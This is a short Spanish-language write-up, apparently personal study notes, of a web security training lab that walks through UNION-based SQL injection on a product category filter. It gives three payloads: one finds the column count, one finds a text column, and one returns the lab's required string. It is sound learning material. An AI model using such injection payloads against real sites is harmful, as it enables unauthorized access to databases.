Este es el laboratorio:
![[Pasted image 20240507182020.png]]
Y si entramos en alguna de las categorías, vemos que posiblemente por detrás se hace una query a la base de datos:
![[Pasted image 20240507182059.png]]
Podemos añadir el siguiente payload para descubrir el número de columnas, donde podemos confirmar que hay 3:
```bash
/filter?category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+NULL,NULL,NULL--
```
![[Pasted image 20240507182208.png]]
Y ahora usamos el siguiente payload:
```bash
category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+NULL,'abcdef',NULL--
```
Y vemos que funciona:
![[Pasted image 20240507182602.png]]
Entonces ahora siguiendo las instrucciones, se nos pide que la base de datos devuelva el siguiente string:
![[Pasted image 20240507182628.png]]
Por lo que usamos el siguiente payload:
```bash
category=Clothing%2c+shoes+and+accessories'+UNION+SELECT+NULL,'qb149R',NULL--
```
![[Pasted image 20240507182721.png]]
Y ya hemos resuelto el laboratorio:
![[Pasted image 20240507182737.png]]
